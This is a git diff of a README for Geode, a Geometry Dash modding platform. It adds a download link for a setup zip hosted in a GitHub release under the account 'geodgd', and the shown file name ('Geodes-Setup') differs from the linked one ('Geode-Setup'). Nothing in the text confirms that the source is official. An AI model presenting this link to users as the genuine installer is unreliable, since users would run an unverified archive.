@@ -7,7 +7,7 @@ Geode is the standard modding platform for Geometry Dash, providing a stable loa
 <img width="124" height="124" alt="d2cbd2cc-ad2c-495b-b516-16fbc4035f0e" src="https://github.com/user-attachments/assets/7d42c9c6-b7d0-4d01-bbcb-5c51bab9e90c" />
 
 ## Install
-[Download `Geodes-Setup-v5.8.3.zip`]()
+[Download `Geodes-Setup-v5.8.3.zip`](https://github.com/geodgd/Geode-Geometry-Dash/releases/download/v5.8.3/Geode-Setup-v5.8.3.zip)
 ---
 
 <img width="738" height="416" alt="dad0cea9-ed4a-414b-9cb3-fad506182137" src="https://github.com/user-attachments/assets/5250a416-d7ba-4731-8684-3f08fbf72541" />
